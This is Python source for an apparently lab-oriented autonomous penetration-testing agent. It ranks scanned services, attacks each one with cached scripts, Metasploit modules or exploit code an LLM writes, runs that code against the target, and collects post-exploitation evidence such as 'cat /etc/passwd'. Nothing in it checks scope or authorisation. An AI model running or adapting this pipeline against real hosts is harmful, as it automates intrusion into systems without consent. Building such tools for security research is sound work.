import json
import logging
from pathlib import Path
from typing import Dict, List, Any, Optional
from datetime import datetime

from apfa_agent.core.llm_client import UniversalLLMClient
from apfa_agent.core.executor import CowboyExecutor
from apfa_agent.llm_ranker import LLMRanker
from apfa_agent.tool_manager import ToolManager
from apfa_agent.rag_manager import RAGManager
from apfa_agent.msf_wrapper import MetasploitWrapper
from apfa_agent.prompts import SYSTEM_PROMPT, RAG_CONTEXT_PROMPT, ERROR_RETRY_PROMPT
from apfa_agent.report_generator import ReportGenerator
from apfa_agent.utils.connectivity import (
    verify_target_before_attack,
    clear_connectivity_cache,
    get_connectivity_cache_stats
)

logger = logging.getLogger(__name__)

class SmartTriageAgent:
    """
    Agent mode (Smart Triage).
    Executes attacks sequentially based on LLM ranking.
    """
    
    def __init__(self, config_path: str = "apfa_agent/config/agent_config.yaml", config: Optional[Dict] = None):
        # Load config
        import yaml
        if config:
            self.config = config
        elif Path(config_path).exists():
            with open(config_path) as f:
                self.config = yaml.safe_load(f)
        else:
            # Try resolving path relative to project root or current file if needed
            # But prefer explicit config passed in
            logger.warning(f"Config file not found at {config_path}, using defaults")
            self.config = {}
        
        # Initialize components
        self.llm_client = UniversalLLMClient(config=self.config)
        self.executor = CowboyExecutor(config=self.config.get('execution', {'require_vm': False}))
        self.ranker = LLMRanker(ranking_strategy="easy_first")
        
        # Initialize Metasploit wrapper
        try:
            msf_config = self.config.get('metasploit', {})
            if msf_config.get('enabled', False):
                logger.info("Initializing Metasploit wrapper...")
                # Use config_path if it exists, otherwise let MSF wrapper use default
                if config_path and Path(config_path).exists():
                    self.msf_wrapper = MetasploitWrapper(config_path=config_path)
                else:
                    self.msf_wrapper = MetasploitWrapper()
                print("✓ Metasploit integration enabled")
            else:
                self.msf_wrapper = None
                logger.info("Metasploit integration disabled")
        except Exception as e:
            logger.warning(f"Failed to initialize Metasploit: {e}")
            self.msf_wrapper = None
        
        # Initialize ToolManager with MSF wrapper
        self.tool_manager = ToolManager(msf_wrapper=self.msf_wrapper)
        self.rag_manager = RAGManager() # Assuming it exists
        self.report_generator = ReportGenerator("data/agent_results")

    def run(self, classified_json_path: Optional[str] = None, nmap_results: Optional[Dict] = None):
        """
        Run the Smart Triage process.
        """
        print("🚀 Starting Smart Triage (Agent mode)...")
        
        # Clear connectivity cache at start of new run to ensure fresh checks
        clear_connectivity_cache()
        logger.info("Connectivity cache cleared for new agent run")
        
        # 1. Rank Targets
        if classified_json_path:
            targets = self.ranker.rank_targets(classified_json_path)
        elif nmap_results:
            # Convert Nmap results to target list
            print("Converting Nmap results to target list...")
            targets = []
            for host in nmap_results.get('hosts', []):
                for svc in host.get('services', []):
                    if svc.get('state') != 'open':
                        continue
                        
                    product = svc.get('product', '')
                    version = svc.get('version', '')
                    pn = f"{product} {version}".strip()
                    if not pn:
                        pn = svc.get('service', 'unknown')
                        
                    target = {
                        'ip': host['ip'],
                        'port': svc['port'],
                        'service': svc['service'],
                        'version': version,
                        'protocol': svc.get('protocol', 'tcp'),
                        'original': {
                            'pn': pn,
                            'name': pn,
                            'cvss': 5.0 # Default priority if unknown
                        }
                    }
                    targets.append(target)
            
            targets = self.ranker.rank_list(targets)
        else:
            print("Error: No targets provided (neither APFA file nor Nmap results)")
            return []

        print(f"📋 Found {len(targets)} targets to attack.")
        
        results = []
        
        for i, target in enumerate(targets):
            print(f"\n[{i+1}/{len(targets)}] Attacking {target['ip']}:{target['port']} ({target['service']})...")
            
            # Pre-flight connectivity check
            print("  🔍 Checking target connectivity...")
            connectivity_timeout = self.config.get('connectivity_timeout', 5)
            is_reachable, connectivity_msg = verify_target_before_attack(
                target['ip'], int(target['port']), timeout=connectivity_timeout
            )
            
            if not is_reachable:
                print(f"  ❌ Target unreachable: {connectivity_msg}")
                print("  ⏭️  Skipping to next target...")
                
                # If this is the first failure for this IP, it's a real check
                # If cached, we skip quickly without redundant network operations
                if "(cached)" in connectivity_msg:
                    print(f"  ℹ️  Using cached result - already known to be unreachable")
                
                result_entry = {
                    'target': target,
                    'success': False,
                    'details': {
                        'status': 'target_unreachable',
                        'error': connectivity_msg,
                        'output': f"Target {target['ip']}:{target['port']} is not reachable. Please verify:\n- VM/target is online\n- Network connectivity\n- Correct IP/port"
                    },
                    'timestamp': datetime.now().isoformat()
                }
                results.append(result_entry)
                continue
            
            print(f"  ✓ Target is reachable, proceeding with attack...")
            
            # 2. Check if we have a cached skill or MSF module
            # In Agent mode, we might still want to use known tools if available
            # But the prompt emphasizes "Execute attacks sequentially" and "Use RAG".
            # It doesn't explicitly say "ignore MSF/Cache", but "Use LLMRanker... Execute attacks".
            # I'll assume we try LLM generation primarily, but maybe check MSF first?
            # The prompt says "Execute attacks sequentially... Use RAG to inject similar past exploits".
            # This implies LLM generation.
            
            success, details = self._attack_target(target)
            
            result_entry = {
                'target': target,
                'success': success,
                'details': details,
                'timestamp': datetime.now().isoformat()
            }
            results.append(result_entry)
            
            if success:
                print("✅ SUCCESS!")
            else:
                print("❌ FAILED.")
                
        # 3. Generate Report using shared report generator
        # NOTE: nmap_results might be None if using APFA data directly
        # We pass nmap_results even if None - report generator handles it
        report = self.report_generator.generate_agent_report(
            config=self.config,
            results=results,
            nmap_results=nmap_results
        )
        
        # Show connectivity cache statistics
        cache_stats = get_connectivity_cache_stats()
        print("\n📊 Connectivity Check Statistics:")
        print(f"   • Unique IPs checked: {cache_stats['total_ips']}")
        print(f"   • Total ports checked: {cache_stats['total_ports_checked']}")
        print(f"   • Cache hits saved: {cache_stats['total_ports_checked'] - cache_stats['total_ips']} redundant checks")
        
        print("\n🏁 Smart Triage completed.")
        return results

    def _attack_target(self, target: Dict) -> tuple[bool, Dict]:
        """
        Attack a single target using multi-tier approach:
        1. Check cached skills
        2. Try Metasploit modules (if available)
        3. Generate new exploit via LLM
        """
        service_sig = f"{target['service']} {target.get('version', '')}".strip()
        target_ip = target['ip']
        port = int(target['port'])
        vuln_name = target.get('original', {}).get('name', 'Unknown')
        
        # Step 1: Decide which exploitation method to use
        print(f"  🔍 Determining best exploitation method...")
        exploit_method, exploit_data = self.tool_manager.get_exploit_method(service_sig)
        
        # Step 2: Execute based on method
        result = None
        
        if exploit_method == "cached_script" and exploit_data:
            # Use cached exploit code
            print(f"  ⚡ Using cached exploit from skill library")
            code = exploit_data.get('code', '')
            result = self.executor.execute(code, target_ip, port)
            
            # Update skill library stats
            self.tool_manager.add_skill(
                service_signature=service_sig,
                skill_type='cached_script',
                code=code,
                port=port,
                success=result['success']
            )
            
        elif exploit_method == "metasploit" and self.msf_wrapper and exploit_data:
            # Use Metasploit module
            print(f"  🔫 Using Metasploit module: {exploit_data.get('module', 'unknown')}")
            result = self._execute_msf_module(target_ip, port, service_sig, exploit_data)
            
            # Save successful MSF module usage
            if result and result['success'] and self.msf_wrapper and exploit_data:
                self.msf_wrapper.save_successful_module(
                    service_signature=service_sig,
                    module=exploit_data.get('module', ''),
                    success=True
                )
                
                # Also add to skill library for future reference
                self.tool_manager.add_skill(
                    service_signature=service_sig,
                    skill_type='metasploit',
                    module=exploit_data.get('module'),
                    port=port,
                    success=True
                )
            
        else:
            # Generate new exploit via LLM
            print(f"  🤖 Generating new exploit via LLM")
            
            # 1. RAG Context
            rag_results = self.rag_manager.retrieve_similar(service_sig)
            rag_context = "\n".join([f"- {r['service']}: {r['code'][:100]}..." for r in rag_results])
            
            # 2. Construct Prompt
            prompt = f"{SYSTEM_PROMPT}\n\n"
            if rag_context:
                prompt += RAG_CONTEXT_PROMPT.format(
                    rag_context=rag_context,
                    target_ip=target_ip,
                    port=port,
                    service=service_sig,
                    vulnerability=vuln_name
                )
            else:
                prompt += f"Target: {target_ip}\nPort: {port}\nService: {service_sig}\nVulnerability: {vuln_name}\n"
                
            # 3. Generate Code (with tool calling enabled)
            target_info = {
                'service': service_sig.split()[0] if service_sig else '',
                'version': target.get('version', ''),
                'port': port,
                'cve': target.get('cve')  # If CVE is available from classifier
            }
            code = self.llm_client.generate_code(prompt, target_info=target_info, use_tools=True)
            
            # 4. Execute
            result = self.executor.execute(code, target_ip, port)
            
            # 5. Save to skill library if successful
            if result['success']:
                self.tool_manager.add_skill(
                    service_signature=service_sig,
                    skill_type='generated_script',
                    code=code,
                    port=port,
                    success=True
                )
                
                # Add to RAG database
                self.rag_manager.add_exploit(
                    service=service_sig,
                    port=port,
                    code=code,
                    success=True
                )
        
        # Step 3: Retry logic if failed (only for LLM-generated exploits)
        if not result['success'] and result['status'] != 'security_violation' and exploit_method == "generate_new":
            print("  ⚠️  First attempt failed, retrying with error feedback...")
            retry_prompt = ERROR_RETRY_PROMPT.format(error=result.get('output', 'Unknown error'))
            target_info = {
                'service': service_sig.split()[0] if service_sig else '',
                'version': target.get('version', ''),
                'port': port,
                'cve': target.get('cve')
            }
            code = self.llm_client.generate_code(retry_prompt, target_info=target_info, use_tools=False)
            result = self.executor.execute(code, target_ip, port)
            
            # Update skill library with retry result
            if result['success']:
                self.tool_manager.add_skill(
                    service_signature=service_sig,
                    skill_type='generated_script',
                    code=code,
                    port=port,
                    success=True
                )
            
        return result['success'], result
    
    def _execute_msf_module(self, target_ip: str, port: int, service_sig: str, module_data: Dict) -> Dict:
        """
        Execute a Metasploit module against the target.
        
        Args:
            target_ip: Target IP address
            port: Target port
            service_sig: Service signature (for logging)
            module_data: Module information from MSF wrapper
            
        Returns:
            Execution result dictionary
        """
        if not self.msf_wrapper or not self.msf_wrapper.client:
            return {
                'success': False,
                'status': 'msf_unavailable',
                'error': 'Metasploit is not available or not connected',
                'output': 'Cannot execute MSF module: Metasploit RPC not connected'
            }
        
        module_path = module_data.get('module', '')
        payload = module_data.get('payload', 'cmd/unix/interact')
        
        print(f"    • Module: {module_path}")
        print(f"    • Payload: {payload}")
        print(f"    • Target: {target_ip}:{port}")
        
        # Prepare options
        options = {
            'RHOSTS': target_ip,
            'RHOST': target_ip,
            'RPORT': str(port),
            'LHOST': self._get_local_ip(),
            'LPORT': '4444'  # Default listener port
        }
        
        # Execute the module
        result = self.msf_wrapper.run_exploit(module_path, options, payload=payload)
        
        # Format output for consistency with CowboyExecutor
        if result.get('success'):
            output = f"STATUS: SUCCESS\n"
            output += f"EXPLOIT: {module_path}\n"
            output += f"PAYLOAD: {payload}\n"
            output += f"SESSION: {result.get('session_id', 'N/A')}\n"
            output += result.get('output', '')
            
            # Try to interact with session for evidence
            if result.get('session_id'):
                session_output = self._collect_msf_session_evidence(result['session_id'])
                output += f"\n{session_output}"
            
            return {
                'success': True,
                'status': 'success',
                'output': output,
                'session_id': result.get('session_id'),
                'exploit_method': 'metasploit',
                'module': module_path,
                'timestamp': datetime.now().isoformat()
            }
        else:
            return {
                'success': False,
                'status': 'failed',
                'error': result.get('error', 'Unknown MSF error'),
                'output': f"STATUS: FAILED\nMetasploit module failed: {result.get('error', 'Unknown error')}",
                'exploit_method': 'metasploit',
                'module': module_path,
                'timestamp': datetime.now().isoformat()
            }
    
    def _get_local_ip(self) -> str:
        """Get local IP address for reverse payloads"""
        import socket
        try:
            # Create a socket to determine local IP
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except Exception:
            return "127.0.0.1"
    
    def _collect_msf_session_evidence(self, session_id: str) -> str:
        """
        Collect evidence from an active MSF session.
        
        Args:
            session_id: The Metasploit session ID
            
        Returns:
            Formatted evidence string
        """
        if not self.msf_wrapper:
            return ""
        
        try:
            evidence = "\n=== POST-EXPLOITATION EVIDENCE ===\n"
            
            # Run common enumeration commands
            commands = ["whoami", "id", "uname -a", "pwd", "hostname", "cat /etc/passwd | head -5"]
            
            results = self.msf_wrapper.interact_with_session(session_id, commands)
            
            for cmd, output in results.items():
                evidence += f"\n$ {cmd}\n{output}\n"
            
            evidence += "=== END EVIDENCE ===\n"
            
            # Save evidence to file
            evidence_dir = Path("data/agent_results/evidence")
            evidence_dir.mkdir(parents=True, exist_ok=True)
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            evidence_file = evidence_dir / f"msf_session_{session_id}_{timestamp}.txt"
            
            with open(evidence_file, 'w') as f:
                f.write(f"MSF Session: {session_id}\n")
                f.write(f"Timestamp: {datetime.now().isoformat()}\n")
                f.write(evidence)
            
            print(f"    📁 Evidence saved: {evidence_file}")
            return evidence
            
        except Exception as e:
            return f"\n[Evidence collection failed: {e}]\n"

    def _generate_report(self, results: List[Dict]):
        """
        DEPRECATED: Use report_generator.generate_agent_report() instead.
        Kept for backward compatibility.
        """
        logger.warning("_generate_report is deprecated. Use ReportGenerator instead.")
        report_path = Path("data/agent_results") / f"smart_triage_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(report_path, 'w') as f:
            json.dump(results, f, indent=2)
        print(f"📄 Report saved to {report_path}")

if __name__ == "__main__":
    # Example usage
    agent = SmartTriageAgent()
    # agent.run("data/processed/ms2_classified.json")
